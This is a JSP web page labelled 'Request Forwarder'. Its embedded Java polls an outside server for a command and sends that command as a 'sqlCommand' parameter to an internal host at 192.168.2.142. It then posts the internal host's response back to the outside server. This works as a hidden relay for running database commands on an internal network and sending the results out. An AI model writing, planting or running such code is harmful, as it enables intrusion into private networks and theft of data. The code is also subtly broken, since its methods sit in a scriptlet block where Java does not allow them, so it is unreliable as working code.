<%@ page import="java.io.BufferedReader, java.io.InputStreamReader, java.io.OutputStreamWriter, java.net.HttpURLConnection, java.net.URL" %>
<%@ page import="java.util.stream.Collectors" %>
<html>
<head>
    <title>Request Forwarder</title>
</head>
<body>
    <h1>Request Forwarder</h1>
    <%
        // Function to make a GET request
        String makeGetRequest(String urlString) throws Exception {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String response = in.lines().collect(Collectors.joining());
            in.close();
            return response;
        }

        // Function to make a POST request
        String makePostRequest(String urlString, String postData) throws Exception {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(postData);
            writer.flush();
            writer.close();
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String response = in.lines().collect(Collectors.joining());
            in.close();
            return response;
        }

        try {
            // Step 1: Make GET request to https://kever.io/jspListen.php
            String initialResponse = makeGetRequest("https://kever.io/jspListen.php");

            // Step 2: Use the output from the first request as the sqlCommand parameter in the second GET request
            String encodedSqlCommand = java.net.URLEncoder.encode(initialResponse, "UTF-8");
            String secondUrl = "http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=" + encodedSqlCommand;
            String secondResponse = makeGetRequest(secondUrl);

            // Step 3: POST the result of the second request back to https://kever.io/jspListen.php
            String postResponse = makePostRequest("https://kever.io/jspListen.php", "result=" + java.net.URLEncoder.encode(secondResponse, "UTF-8"));

            // Display the final response
            out.println("Final response from POST: " + postResponse);
        } catch (Exception e) {
            e.printStackTrace(out);
        }
    %>
</body>
</html>